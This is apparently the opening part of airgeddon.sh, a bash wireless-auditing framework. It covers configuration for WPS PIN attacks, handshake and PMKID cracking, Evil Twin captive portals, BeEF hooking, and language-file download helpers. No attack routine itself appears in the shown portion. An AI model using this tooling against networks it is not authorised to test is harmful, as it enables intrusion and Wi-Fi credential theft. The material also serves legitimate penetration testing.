#!/usr/bin/env bash
#Title........: airgeddon.sh
#Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
#Author.......: v1s1t0r
#Version......: 12.0
#Usage........: bash airgeddon.sh
#Bash Version.: 4.2 or later

#Global shellcheck disabled warnings
#shellcheck disable=SC2154,SC2034

#Language vars
#Change this line to select another default language. Select one from available values in array
language="ENGLISH"
declare -A lang_association=(
								["en"]="ENGLISH"
								["es"]="SPANISH"
								["fr"]="FRENCH"
								["ca"]="CATALAN"
								["pt"]="PORTUGUESE"
								["ru"]="RUSSIAN"
								["gr"]="GREEK"
								["it"]="ITALIAN"
								["pl"]="POLISH"
								["de"]="GERMAN"
								["tr"]="TURKISH"
								["ar"]="ARABIC"
								["zh"]="CHINESE"
							)

rtl_languages=(
				"ARABIC"
				)

#Tools vars
essential_tools_names=(
						"iw"
						"awk"
						"airmon-ng"
						"airodump-ng"
						"aircrack-ng"
						"xterm"
						"ip"
						"lspci"
						"ps"
					)

optional_tools_names=(
						"wpaclean"
						"crunch"
						"aireplay-ng"
						"mdk4"
						"hashcat"
						"hostapd"
						"dhcpd"
						"nft"
						"ettercap"
						"etterlog"
						"lighttpd"
						"dnsmasq"
						"wash"
						"reaver"
						"bully"
						"pixiewps"
						"bettercap"
						"beef"
						"packetforge-ng"
						"hostapd-wpe"
						"asleap"
						"john"
						"openssl"
						"hcxpcapngtool"
						"hcxdumptool"
						"tshark"
						"tcpdump"
						"besside-ng"
					)

update_tools=("curl")

declare -A possible_package_names=(
									[${essential_tools_names[0]}]="iw" #iw
									[${essential_tools_names[1]}]="awk / gawk" #awk
									[${essential_tools_names[2]}]="aircrack-ng" #airmon-ng
									[${essential_tools_names[3]}]="aircrack-ng" #airodump-ng
									[${essential_tools_names[4]}]="aircrack-ng" #aircrack-ng
									[${essential_tools_names[5]}]="xterm" #xterm
									[${essential_tools_names[6]}]="iproute2" #ip
									[${essential_tools_names[7]}]="pciutils" #lspci
									[${essential_tools_names[8]}]="procps / procps-ng" #ps
									[${optional_tools_names[0]}]="aircrack-ng" #wpaclean
									[${optional_tools_names[1]}]="crunch" #crunch
									[${optional_tools_names[2]}]="aircrack-ng" #aireplay-ng
									[${optional_tools_names[3]}]="mdk4" #mdk4
									[${optional_tools_names[4]}]="hashcat" #hashcat
									[${optional_tools_names[5]}]="hostapd" #hostapd
									[${optional_tools_names[6]}]="isc-dhcp-server / dhcp-server / dhcp" #dhcpd
									[${optional_tools_names[7]}]="nftables" #nft
									[${optional_tools_names[8]}]="ettercap / ettercap-text-only / ettercap-graphical" #ettercap
									[${optional_tools_names[9]}]="ettercap / ettercap-text-only / ettercap-graphical" #etterlog
									[${optional_tools_names[10]}]="lighttpd" #lighttpd
									[${optional_tools_names[11]}]="dnsmasq" #dnsmasq
									[${optional_tools_names[12]}]="reaver" #wash
									[${optional_tools_names[13]}]="reaver" #reaver
									[${optional_tools_names[14]}]="bully" #bully
									[${optional_tools_names[15]}]="pixiewps" #pixiewps
									[${optional_tools_names[16]}]="bettercap" #bettercap
									[${optional_tools_names[17]}]="beef-xss / beef-project" #beef
									[${optional_tools_names[18]}]="aircrack-ng" #packetforge-ng
									[${optional_tools_names[19]}]="hostapd-wpe" #hostapd-wpe
									[${optional_tools_names[20]}]="asleap" #asleap
									[${optional_tools_names[21]}]="john" #john
									[${optional_tools_names[22]}]="openssl" #openssl
									[${optional_tools_names[23]}]="hcxtools" #hcxpcapngtool
									[${optional_tools_names[24]}]="hcxdumptool" #hcxdumptool
									[${optional_tools_names[25]}]="tshark / wireshark-cli / wireshark" #tshark
									[${optional_tools_names[26]}]="tcpdump" #tcpdump
									[${optional_tools_names[27]}]="aircrack-ng" #besside-ng
									[${update_tools[0]}]="curl" #curl
								)

#More than one alias can be defined separated by spaces at value
declare -A possible_alias_names=(
									["beef"]="beef-xss beef-server"
								)

#General vars
airgeddon_version="12.0"
language_strings_expected_version="12.0-1"
standardhandshake_filename="handshake-01.cap"
standardpmkid_filename="pmkid_hash.txt"
standardpmkidcap_filename="pmkid.cap"
timeout_capture_handshake_decloak="20"
timeout_capture_pmkid="15"
timeout_capture_identities="30"
osversionfile_dir="/etc/"
plugins_dir="plugins/"
ag_orchestrator_file="ag.orchestrator.txt"
system_tmpdir="/tmp/"
minimum_bash_version_required="4.2"
resume_message=224
abort_question=12
pending_of_translation="[PoT]"
escaped_pending_of_translation="\[PoT\]"
standard_resolution="1024x768"
curl_404_error="404: Not Found"
rc_file_name=".airgeddonrc"
alternative_rc_file_name="airgeddonrc"
language_strings_file="language_strings.sh"
broadcast_mac="FF:FF:FF:FF:FF:FF"
minimum_hcxdumptool_filterap_version="6.0.0"
minimum_hcxdumptool_bpf_version="6.3.0"

#5Ghz and 6Ghz vars
ghz="Ghz"
band_24ghz="2.4${ghz}"
band_5ghz="5${ghz}"
band_6ghz="6${ghz}"
valid_channels_24_ghz_regexp="([1-9]|1[0-4])"
valid_channels_24_and_5_ghz_regexp="([1-9]|1[0-4]|3[68]|4[02468]|5[02468]|6[024]|10[02468]|11[02468]|12[02468]|13[2468]|14[0249]|15[13579]|16[15])"
#TODO valid channels 24 and 5ghz and 6ghz
minimum_wash_dualscan_version="1.6.5"

#aircrack vars
aircrack_tmp_simple_name_file="aircrack"
aircrack_pot_tmp="${aircrack_tmp_simple_name_file}.pot"
aircrack_pmkid_version="1.4"

#hashcat vars
hashcat3_version="3.0"
hashcat4_version="4.0.0"
hashcat_hccapx_version="3.40"
hashcat_hcx_conversion_version="6.2.0"
minimum_hashcat_pmkid_version="6.0.0"
hashcat_2500_deprecated_version="6.2.4"
hashcat_handshake_cracking_plugin="2500"
hashcat_pmkid_cracking_plugin="22000"
hashcat_enterprise_cracking_plugin="5500"
hashcat_tmp_simple_name_file="hctmp"
hashcat_tmp_file="${hashcat_tmp_simple_name_file}.hccap"
hashcat_pot_tmp="${hashcat_tmp_simple_name_file}.pot"
hashcat_output_file="${hashcat_tmp_simple_name_file}.out"
hccapx_tool="cap2hccapx"
possible_hccapx_converter_known_locations=(
										"/usr/lib/hashcat-utils/${hccapx_tool}.bin"
									)

#john the ripper vars
jtr_tmp_simple_name_file="jtrtmp"
jtr_pot_tmp="${jtr_tmp_simple_name_file}.pot"
jtr_output_file="${jtr_tmp_simple_name_file}.out"

#WEP vars
wep_data="wepdata"
wepdir="wep/"
wep_attack_file="ag.wepattack.sh"
wep_key_handler="ag.wep_key_handler.sh"
wep_processes_file="wep_processes"
wep_besside_log="ag.besside.log"

#Docker vars
docker_based_distro="Kali"
docker_io_dir="/io/"

#WPS vars
minimum_reaver_pixiewps_version="1.5.2"
minimum_reaver_nullpin_version="1.6.1"
minimum_bully_pixiewps_version="1.1"
minimum_bully_verbosity4_version="1.1"
minimum_wash_json_version="1.6.2"
known_pins_dbfile="known_pins.db"
pins_dbfile_checksum="pindb_checksum.txt"
wps_default_generic_pin="12345670"
wps_attack_script_file="ag.wpsattack.sh"
wps_out_file="ag.wpsout.txt"
timeout_secs_per_pin="30"
timeout_secs_per_pixiedust="30"

#Repository and contact vars
repository_hostname="github.com"
github_user="v1s1t0r1sh3r3"
github_repository="airgeddon"
branch="master"
script_filename="airgeddon.sh"
urlgithub="https://${repository_hostname}/${github_user}/${github_repository}"
urlscript_directlink="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${script_filename}"
urlscript_pins_dbfile="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${known_pins_dbfile}"
urlscript_pins_dbfile_checksum="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${pins_dbfile_checksum}"
urlscript_language_strings_file="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${language_strings_file}"
urlscript_options_config_file="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${rc_file_name}"
urlgithub_wiki="https://${repository_hostname}/${github_user}/${github_repository}/wiki"
urlmerchandising_shop="https://airgeddon.creator-spring.com/"
mail="v1s1t0r.1s.h3r3@gmail.com"
author="v1s1t0r"

#Dhcpd, Hostapd and misc Evil Twin vars
loopback_ip="127.0.0.1"
loopback_ipv6="::1/128"
loopback_interface="lo"
routing_tmp_file="ag.iptables_nftables"
dhcpd_file="ag.dhcpd.conf"
dhcpd_pid_file="dhcpd.pid"
dnsmasq_file="ag.dnsmasq.conf"
internet_dns1="8.8.8.8"
internet_dns2="8.8.4.4"
internet_dns3="139.130.4.5"
bettercap_proxy_port="8080"
bettercap_dns_port="5300"
dns_port="53"
dhcp_port="67"
www_port="80"
https_port="443"
minimum_bettercap_advanced_options="1.5.9"
minimum_bettercap_fixed_beef_iptables_issue="1.6.2"
bettercap2_version="2.0"
bettercap2_sslstrip_working_version="2.28"
ettercap_file="ag.ettercap.log"
bettercap_file="ag.bettercap.log"
bettercap_config_file="ag.bettercap.cap"
bettercap_hook_file="ag.bettercap.js"
beef_port="3000"
beef_control_panel_url="http://${loopback_ip}:${beef_port}/ui/panel"
jshookfile="hook.js"
beef_file="ag.beef.conf"
beef_pass="airgeddon"
beef_db="beef.db"
beef_default_cfg_file="config.yaml"
beef_needed_brackets_version="0.4.7.2"
beef_installation_url="https://github.com/beefproject/beef/wiki/Installation"
hostapd_file="ag.hostapd.conf"
hostapd_wpe_file="ag.hostapd_wpe.conf"
hostapd_wpe_log="ag.hostapd_wpe.log"
hostapd_wpe_default_log="hostapd-wpe.log"
control_et_file="ag.et_control.sh"
control_enterprise_file="ag.enterprise_control.sh"
enterprisedir="enterprise/"
certsdir="certs/"
certspass="airgeddon"
default_certs_path="/etc/hostapd-wpe/certs/"
default_certs_pass="whatever"
webserver_file="ag.lighttpd.conf"
webserver_log="ag.lighttpd.log"
webdir="www/"
indexfile="index.htm"
checkfile="check.htm"
cssfile="portal.css"
jsfile="portal.js"
pixelfile="pixel.png"
attemptsfile="ag.et_attempts.txt"
currentpassfile="ag.et_currentpass.txt"
et_successfile="ag.et_success.txt"
enterprise_successfile="ag.enterprise_success.txt"
et_processesfile="ag.et_processes.txt"
asleap_pot_tmp="ag.asleap_tmp.txt"
channelfile="ag.et_channel.txt"
possible_dhcp_leases_files=(
								"/var/lib/dhcp/dhcpd.leases"
								"/var/state/dhcp/dhcpd.leases"
								"/var/lib/dhcpd/dhcpd.leases"
							)
possible_beef_known_locations=(
									"/usr/share/beef/"
									"/usr/share/beef-xss/"
									"/opt/beef/"
									"/opt/beef-project/"
									"/usr/lib/beef/"
									#Custom BeEF location (set=0)
								)

#Connection vars
ips_to_check_internet=(
						"${internet_dns1}"
						"${internet_dns2}"
						"${internet_dns3}"
					)

#Distros vars
known_compatible_distros=(
							"Wifislax"
							"Kali"
							"Parrot"
							"Backbox"
							"BlackArch"
							"Cyborg"
							"Ubuntu"
							"Mint"
							"Debian"
							"SuSE"
							"CentOS"
							"Gentoo"
							"Fedora"
							"Red Hat"
							"Arch"
							"OpenMandriva"
							"Pentoo"
							"Manjaro"
						)

known_incompatible_distros=(
							"Microsoft"
						)

known_arm_compatible_distros=(
								"Raspbian"
								"Raspberry Pi OS"
								"Parrot arm"
								"Kali arm"
							)

#Sponsors
sponsors=(
		"Raleigh2016"
		"hmmlopl"
		"codythebeast89"
		)

#Hint vars
declare main_hints=(128 134 163 437 438 442 445 516 590 626 660 697 699 712 739)
declare dos_hints=(129 131 133 697 699)
declare handshake_pmkid_decloaking_hints=(127 130 132 664 665 697 699 728 729)
declare dos_handshake_decloak_hints=(142 697 699 733 739)
declare decrypt_hints=(171 179 208 244 163 697 699)
declare personal_decrypt_hints=(171 178 179 208 244 163 697 699)
declare enterprise_decrypt_hints=(171 179 208 244 163 610 697 699)
declare select_interface_hints=(246 697 699 712 739)
declare language_hints=(250 438)
declare option_hints=(445 250 448 477 591 626 697 699)
declare evil_twin_hints=(254 258 264 269 309 328 400 509 697 699 739)
declare evil_twin_dos_hints=(267 268 509 697 699)
declare beef_hints=(408)
declare wps_hints=(342 343 344 356 369 390 490 625 697 699 739)
declare wep_hints=(431 429 428 432 433 697 699 739)
declare enterprise_hints=(112 332 483 518 629 301 697 699 739 742)

#Charset vars
crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
crunch_uppercasecharset="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
crunch_numbercharset="0123456789"
crunch_symbolcharset="!#$%/=?{}[]-*:;"
hashcat_charsets=("?l" "?u" "?d" "?s")

#Tmux vars
airgeddon_uid=""
session_name="airgeddon"
tmux_main_window="airgeddon-Main"
no_hardcore_exit=0

#Check coherence between script and language_strings file
function check_language_strings() {

	debug_print

	if [ -f "${scriptfolder}${language_strings_file}" ]; then

		language_file_found=1
		language_file_mismatch=0
		#shellcheck source=./language_strings.sh
		source "${scriptfolder}${language_strings_file}"
		set_language_strings_version
		if [ "${language_strings_version}" != "${language_strings_expected_version}" ]; then
			language_file_mismatch=1
		fi
	else
		language_file_found=0
	fi

	if [[ "${language_file_found}" -eq 0 ]] || [[ "${language_file_mismatch}" -eq 1 ]]; then

		language_strings_handling_messages

		generate_dynamic_line "airgeddon" "title"
		if [ "${language_file_found}" -eq 0 ]; then
			echo_red "${language_strings_no_file[${language}]}"
			if [ "${airgeddon_version}" = "6.1" ]; then
				echo
				echo_yellow "${language_strings_first_time[${language}]}"
			fi
		elif [ "${language_file_mismatch}" -eq 1 ]; then
			echo_red "${language_strings_file_mismatch[${language}]}"
		fi

		echo
		echo_blue "${language_strings_try_to_download[${language}]}"
		read -p "${language_strings_key_to_continue[${language}]}" -r

		if check_repository_access; then

			if download_language_strings_file; then
				echo
				echo_yellow "${language_strings_successfully_downloaded[${language}]}"
				read -p "${language_strings_key_to_continue[${language}]}" -r
				clear
				return 0
			else
				echo
				echo_red "${language_strings_failed_downloading[${language}]}"
			fi
		else
			echo
			echo_red "${language_strings_failed_downloading[${language}]}"
		fi

		echo
		echo_blue "${language_strings_exiting[${language}]}"
		echo
		hardcore_exit
	fi
}

#Download the language strings file
function download_language_strings_file() {

	debug_print

	local lang_file_downloaded=0
	remote_language_strings_file=$(timeout -s SIGTERM 15 curl -L ${urlscript_language_strings_file} 2> /dev/null)

	if [[ -n "${remote_language_strings_file}" ]] && [[ "${remote_language_strings_file}" != "${curl_404_error}" ]]; then
		lang_file_downloaded=1
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			remote_language_strings_file=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_language_strings_file} 2> /dev/null)
			if [[ -n "${remote_language_strings_file}" ]] && [[ "${remote_language_strings_file}" != "${curl_404_error}" ]]; then
				lang_file_downloaded=1
			fi
		fi
	fi

	if [ "${lang_file_downloaded}" -eq 1 ]; then
		echo "${remote_language_strings_file}" > "${scriptfolder}${language_strings_file}"
		chmod +x "${scriptfolder}${language_strings_file}" > /dev/null 2>&1
		#shellcheck source=./language_strings.sh
		source "${scriptfolder}${language_strings_file}"
		return 0
	else
		return 1
	fi
}

#Set messages for language_strings handling
function language_strings_handling_messages() {

	declare -gA language_strings_no_file
	language_strings_no_file["ENGLISH"]="Error. Language strings file not found"
	language_strings_no_file["SPANISH"]="Error. No se ha encontrado el fichero de traducciones"
	language_strings_no_file["FRENCH"]="Erreur. Fichier contenant les traductions absent"
	language_strings_no_file["CATALAN"]="Error. No s'ha trobat el fitxer de traduccions"
	language_strings_no_file["PORTUGUESE"]="Erro. O arquivo de tradução não foi encontrado"
	language_strings_no_file["RUSSIAN"]="Ошибка. Не найден языковой файл"
	language_strings_no_file["GREEK"]="Σφάλμα. Το αρχείο γλωσσών δεν βρέθηκε"
	language_strings_no_file["ITALIAN"]="Errore. Non si trova il file delle traduzioni"
	language_strings_no_file["POLISH"]="Błąd. Nie znaleziono pliku tłumaczenia"
	language_strings_no_file["GERMAN"]="Fehler. Die Übersetzungsdatei wurde nicht gefunden"
	language_strings_no_file["TURKISH"]="Hata. Çeviri dosyası bulunamadı"
	language_strings_no_file["ARABIC"]="خطأ. ملف اللغة غير موجود"
	language_strings_no_file["CHINESE"]="错误。未找到语言支持文件"

	declare -gA language_strings_file_mismatch
	language_strings_file_mismatch["ENGLISH"]="Error. The language strings file found mismatches expected version"
	language_strings_file_mismatch["SPANISH"]="Error. El fichero de traducciones encontrado no es la versión esperada"
	language_strings_file_mismatch["FRENCH"]="Erreur. Les traductions trouvées ne sont pas celles attendues"
	language_strings_file_mismatch["CATALAN"]="Error. El fitxer de traduccions trobat no és la versió esperada"
	language_strings_file_mismatch["PORTUGUESE"]="Erro. O a versão do arquivos de tradução encontrado é a incompatível"
	language_strings_file_mismatch["RUSSIAN"]="Ошибка. Языковой файл не соответствует ожидаемой версии"
	language_strings_file_mismatch["GREEK"]="Σφάλμα. Το αρχείο γλωσσών που έχει βρεθεί δεν αντιστοιχεί με την προαπαιτούμενη έκδοση"
	language_strings_file_mismatch["ITALIAN"]="Errore. Il file delle traduzioni trovato non è la versione prevista"
	language_strings_file_mismatch["POLISH"]="Błąd. Znaleziony plik tłumaczenia nie jest oczekiwaną wersją"
	language_strings_file_mismatch["GERMAN"]="Fehler. Die gefundene Übersetzungsdatei ist nicht die erwartete Version"
	language_strings_file_mismatch["TURKISH"]="Hata. Bulunan çeviri dosyası beklenen sürüm değil"
	language_strings_file_mismatch["ARABIC"]="خطأ. ملف اللغة غيرمتطابق مع الإصدار المتوقع"
	language_strings_file_mismatch["CHINESE"]="错误。发现语言支持文件与预期版本不匹配"

	declare -gA language_strings_try_to_download
	language_strings_try_to_download["ENGLISH"]="airgeddon will try to download the language strings file..."
	language_strings_try_to_download["SPANISH"]="airgeddon intentará descargar el fichero de traducciones..."
	language_strings_try_to_download["FRENCH"]="airgeddon va essayer de télécharger les fichiers de traductions..."
	language_strings_try_to_download["CATALAN"]="airgeddon intentarà descarregar el fitxer de traduccions..."
	language_strings_try_to_download["PORTUGUESE"]="O airgeddon tentará baixar o arquivo de tradução..."
	language_strings_try_to_download["RUSSIAN"]="airgeddon попытается загрузить языковой файл..."
	language_strings_try_to_download["GREEK"]="Το airgeddon θα προσπαθήσει να κατεβάσει το αρχείο γλωσσών..."
	language_strings_try_to_download["ITALIAN"]="airgeddon cercherá di scaricare il file delle traduzioni..."
	language_strings_try_to_download["POLISH"]="airgeddon spróbuje pobrać plik tłumaczeń..."
	language_strings_try_to_download["GERMAN"]="airgeddon wird versuchen, die Übersetzungsdatei herunterzuladen..."
	language_strings_try_to_download["TURKISH"]="airgeddon çeviri dosyasını indirmeye çalışacak..."
	language_strings_try_to_download["ARABIC"]="سيحاول airgeddon تنزيل ملف سلاسل اللغة ..."
	language_strings_try_to_download["CHINESE"]="airgeddon 将尝试下载语言支持文件..."

	declare -gA language_strings_successfully_downloaded
	language_strings_successfully_downloaded["ENGLISH"]="Language strings file was successfully downloaded"
	language_strings_successfully_downloaded["SPANISH"]="Se ha descargado con éxito el fichero de traducciones"
	language_strings_successfully_downloaded["FRENCH"]="Les fichiers traduction ont été correctement téléchargés"
	language_strings_successfully_downloaded["CATALAN"]="S'ha descarregat amb èxit el fitxer de traduccions"
	language_strings_successfully_downloaded["PORTUGUESE"]="O arquivo de tradução foi baixado com sucesso"
	language_strings_successfully_downloaded["RUSSIAN"]="Языковой файл был успешно загружен"
	language_strings_successfully_downloaded["GREEK"]="Το αρχείο γλωσσών κατέβηκε με επιτυχία"
	language_strings_successfully_downloaded["ITALIAN"]="Il file delle traduzioni è stato scaricato con successo"
	language_strings_successfully_downloaded["POLISH"]="Plik z tłumaczeniem został pomyślnie pobrany"
	language_strings_successfully_downloaded["GERMAN"]="Die Übersetzungsdatei wurde erfolgreich heruntergeladen"
	language_strings_successfully_downloaded["TURKISH"]="Çeviri dosyası başarıyla indirildi"
	language_strings_successfully_downloaded["ARABIC"]="تم تنزيل ملف سلاسل اللغة بنجاح"
	language_strings_successfully_downloaded["CHINESE"]="语言支持文件已成功下载"

	declare -gA language_strings_failed_downloading
	language_strings_failed_downloading["ENGLISH"]="The language string file can't be downloaded. Check your internet connection or download it manually from ${normal_color}${urlgithub}"
	language_strings_failed_downloading["SPANISH"]="No se ha podido descargar el fichero de traducciones. Comprueba tu conexión a internet o descárgalo manualmente de ${normal_color}${urlgithub}"
	language_strings_failed_downloading["FRENCH"]="Impossible de télécharger le fichier traduction. Vérifiez votre connexion à internet ou téléchargez le fichier manuellement ${normal_color}${urlgithub}"
	language_strings_failed_downloading["CATALAN"]="No s'ha pogut descarregar el fitxer de traduccions. Comprova la connexió a internet o descarrega'l manualment de ${normal_color}${urlgithub}"
	language_strings_failed_downloading["PORTUGUESE"]="Não foi possível baixar o arquivos de tradução. Verifique a sua conexão com a internet ou baixe manualmente em ${normal_color}${urlgithub}"
	language_strings_failed_downloading["RUSSIAN"]="Языковой файл не может быть загружен. Проверьте подключение к Интернету или загрузите его вручную с ${normal_color}${urlgithub}"
	language_strings_failed_downloading["GREEK"]="Το αρχείο γλωσσών δεν μπορεί να κατέβει. Ελέγξτε τη σύνδεση σας με το διαδίκτυο ή κατεβάστε το χειροκίνητα ${normal_color}${urlgithub}"
	language_strings_failed_downloading["ITALIAN"]="Impossibile scaricare il file delle traduzioni. Controlla la tua connessione a internet o scaricalo manualmente ${normal_color}${urlgithub}"
	language_strings_failed_downloading["POLISH"]="Nie można pobrać pliku tłumaczenia. Sprawdź połączenie internetowe lub pobierz go ręcznie z ${normal_color}${urlgithub}"
	language_strings_failed_downloading["GERMAN"]="Die Übersetzungsdatei konnte nicht heruntergeladen werden. Überprüfen Sie Ihre Internetverbindung oder laden Sie sie manuell von ${normal_color}${urlgithub} runter"
	language_strings_failed_downloading["TURKISH"]="Çeviri dosyası indirilemedi. İnternet bağlantınızı kontrol edin veya manuel olarak indirin ${normal_color}${urlgithub}"
	language_strings_failed_downloading["ARABIC"]="${normal_color}${urlgithub}${red_color} لا يمكن تنزيل ملف اللغة. تحقق من اتصالك بالإنترنت أو قم بتنزيله يدويًا من"
	language_strings_failed_downloading["CHINESE"]="无法下载语言支持文件。检查您的互联网连接或从 手动下载 ${normal_color}${urlgithub}"

	declare -gA language_strings_first_time
	language_strings_first_time["ENGLISH"]="If you are seeing this message after an automatic update, don't be scared! It's probably because airgeddon has different file structure since version 6.1. It will be automatically fixed"
	language_strings_first_time["SPANISH"]="Si estás viendo este mensaje tras una actualización automática, ¡no te asustes! probablemente es porque a partir de la versión 6.1 la estructura de ficheros de airgeddon ha cambiado. Se reparará automáticamente"
	language_strings_first_time["FRENCH"]="Si vous voyez ce message après une mise à jour automatique ne vous inquiétez pas! A partir de la version 6.1 la structure de fichier d'airgeddon a changé. L'ajustement se fera automatiquement"
	language_strings_first_time["CATALAN"]="Si estàs veient aquest missatge després d'una actualització automàtica, no t'espantis! probablement és perquè a partir de la versió 6.1 l'estructura de fitxers de airgeddon ha canviat. Es repararà automàticament"
	language_strings_first_time["PORTUGUESE"]="Se você está vendo esta mensagem depois de uma atualização automática, não tenha medo! A partir da versão 6.1 da estrutura de arquivos do airgeddon mudou. Isso será corrigido automaticamente"
	language_strings_first_time["RUSSIAN"]="Если вы видите это сообщение после автоматического обновления, не переживайте! Вероятно, это объясняется тем, что, начиная с версии 6.1, airgeddon имеет другую структуру файлов. Проблема будет разрешена автоматически"
	language_strings_first_time["GREEK"]="Εάν βλέπετε αυτό το μήνυμα μετά από κάποια αυτόματη ενημέρωση, μην τρομάξετε! Πιθανόν είναι λόγω της διαφορετικής δομής του airgeddon μετά από την έκδοση 6.1. Θα επιδιορθωθεί αυτόματα"
	language_strings_first_time["ITALIAN"]="Se stai vedendo questo messaggio dopo un aggiornamento automatico, niente panico! probabilmente è perché a partire dalla versione 6.1 é cambiata la struttura dei file di airgeddon. Sarà riparato automaticamente"
	language_strings_first_time["POLISH"]="Jeśli widzisz tę wiadomość po automatycznej aktualizacji, nie obawiaj się! To prawdopodobnie dlatego, że w wersji 6.1 zmieniła się struktura plików airgeddon. Naprawi się automatycznie"
	language_strings_first_time["GERMAN"]="Wenn Sie diese Nachricht nach einem automatischen Update sehen, haben Sie keine Angst! Das liegt vermutlich daran, dass ab Version 6.1 die Dateistruktur von airgeddon geändert wurde. Es wird automatisch repariert"
	language_strings_first_time["TURKISH"]="Otomatik bir güncellemeden sonra bu mesajı görüyorsanız, korkmayın! muhtemelen 6.1 sürümünden itibaren airgeddon dosya yapısı değişmiştir. Otomatik olarak tamir edilecektir"
	language_strings_first_time["ARABIC"]="إذا كنت ترى هذه الرسالة بعد التحديث التلقائي ، فلا تخف! ربما يرجع السبب في ذلك إلى أن airgeddon له بنية ملفات مختلفة منذ الإصدار 6.1. سيتم إصلاحه تلقائيًا "
	language_strings_first_time["CHINESE"]="如果您在自动更新后看到此消息，请不要害怕！这可能是因为 airgeddon 从 6.1 版本开始有不同的文件结构。会自动修复"

	declare -gA language_strings_exiting
	language_strings_exiting["ENGLISH"]="Exiting airgeddon script v${airgeddon_version} - See you soon! :)"
	language_strings_exiting["SPANISH"]="Saliendo de airgeddon script v${airgeddon_version} - Nos vemos pronto! :)"
	language_strings_exiting["FRENCH"]="Fermeture du script airgeddon v${airgeddon_version} - A bientôt! :)"
	language_strings_exiting["CATALAN"]="Sortint de airgeddon script v${airgeddon_version} - Ens veiem aviat! :)"
	language_strings_exiting["PORTUGUESE"]="Saindo do script airgeddon v${airgeddon_version} - Até breve! :)"
	language_strings_exiting["RUSSIAN"]="Выход из скрипта airgeddon v${airgeddon_version} - До встречи! :)"
	language_strings_exiting["GREEK"]="Κλείσιμο του airgeddon v${airgeddon_version} - Αντίο :)"
	language_strings_exiting["ITALIAN"]="Uscendo dallo script airgeddon v${airgeddon_version} - A presto! :)"
	language_strings_exiting["POLISH"]="Wyjście z skryptu airgeddon v${airgeddon_version} - Do zobaczenia wkrótce! :)"
	language_strings_exiting["GERMAN"]="Sie verlassen airgeddon v${airgeddon_version} - Bis bald! :)"
	language_strings_exiting["TURKISH"]="airgeddon yazılımından çıkış yapılıyor v${airgeddon_version} - Yakında görüşürüz! :)"
	language_strings_exiting["ARABIC"]="الخروج من البرنامج airgeddon v${airgeddon_version}- نراكم قريبًا! :)"
	language_strings_exiting["CHINESE"]="退出 airgeddon 脚本 v${airgeddon_version} - 待会见！ :)"

	declare -gA language_strings_key_to_continue
	language_strings_key_to_continue["ENGLISH"]="Press [Enter] key to continue..."
	language_strings_key_to_continue["SPANISH"]="Pulsa la tecla [Enter] para continuar..."
	language_strings_key_to_continue["FRENCH"]="Pressez [Enter] pour continuer..."
	language_strings_key_to_continue["CATALAN"]="Prem la tecla [Enter] per continuar..."
	language_strings_key_to_continue["PORTUGUESE"]="Pressione a tecla [Enter] para continuar..."
	language_strings_key_to_continue["RUSSIAN"]="Нажмите клавишу [Enter] для продолжения..."
	language_strings_key_to_continue["GREEK"]="Πατήστε το κουμπί [Enter] για να συνεχίσετε..."
	language_strings_key_to_continue["ITALIAN"]="Premere il tasto [Enter] per continuare..."
	language_strings_key_to_continue["POLISH"]="Naciśnij klawisz [Enter] aby kontynuować..."
	language_strings_key_to_continue["GERMAN"]="Drücken Sie die [Enter]-Taste um fortzufahren..."
	language_strings_key_to_continue["TURKISH"]="Devam etmek için [Enter] tuşuna basın..."
	language_strings_key_to_continue["ARABIC"]="اضغط على مفتاح [Enter] للمتابعة ..."
	language_strings_key_to_continue["CHINESE"]="按 [Enter] 键继续..."
}

#Generic toggle option function
function option_toggle() {

	debug_print

	local required_reboot=0
	if [[ -n "${2}" ]] && [[ "${2}" = "required_reboot" ]]; then
		required_reboot=1
	fi

	local option_var_name="${1}"
	local option_var_value="${!1}"

	if "${option_var_value:-true}"; then
		sed -ri "s:(${option_var_name})=(true):\1=false:" "${rc_path}" 2> /dev/null
		if ! grep "${option_var_name}=false" "${rc_path}" > /dev/null; then
			return 1
		fi

		if [ "${required_reboot}" -eq 0 ]; then
			eval "export ${option_var_name}=false"
		fi
	else
		sed -ri "s:(${option_var_name})=(false):\1=true:" "${rc_path}" 2> /dev/null
		if ! grep "${option_var_name}=true" "${rc_path}" > /dev/null; then
			return 1
		fi

		if [ "${required_reboot}" -eq 0 ]; then
			eval "export ${option_var_name}=true"
		fi
	fi

	case "${option_var_name}" in
		"AIRGEDDON_BASIC_COLORS")
			remap_colors
		;;
		"AIRGEDDON_EXTENDED_COLORS")
			initialize_extended_colorized_output
		;;
		"AIRGEDDON_5GHZ_ENABLED")
			phy_interface=$(physical_interface_finder "${interface}")
			check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
			secondary_phy_interface=$(physical_interface_finder "${secondary_wifi_interface}")
			check_interface_supported_bands "${secondary_phy_interface}" "secondary_wifi_interface"
		;;
	esac

	return 0
}

#Get current permanent language
function get_current_permanent_language() {

	debug_print

	current_permanent_language=$(grep "language=" "${scriptfolder}${scriptname}" | grep -v "auto_change_language" | head -n 1 | awk -F "=" '{print $2}')
	current_permanent_language=$(echo "${current_permanent_language}" | sed -e 's/^"//;s/"$//')
}

#Set language as permanent
function set_permanent_language() {

	debug_print

	sed -ri "s:^([l]anguage)=\"[a-zA-Z]+\":\1=\"${language}\":" "${scriptfolder}${scriptname}" 2> /dev/null
	if ! grep -E "^[l]anguage=\"${language}\"" "${scriptfolder}${scriptname}" > /dev/null; then
		return 1
	fi
	return 0
}

#Print the current line of where this was called and the function's name. Applies to some (which are useful) functions
function debug_print() {

	if "${AIRGEDDON_DEBUG_MODE:-true}"; then

		declare excluded_functions=(
							"airmon_fix"
							"ask_yesno"
							"check_pending_of_translation"
							"clean_env_vars"
							"contains_element"
							"create_instance_orchestrator_file"
							"create_rcfile"
							"echo_blue"
							"echo_brown"
							"echo_cyan"
							"echo_green"
							"echo_green_title"
							"echo_pink"
							"echo_red"
							"echo_red_slim"
							"echo_white"
							"echo_yellow"
							"env_vars_initialization"
							"env_vars_values_validation"
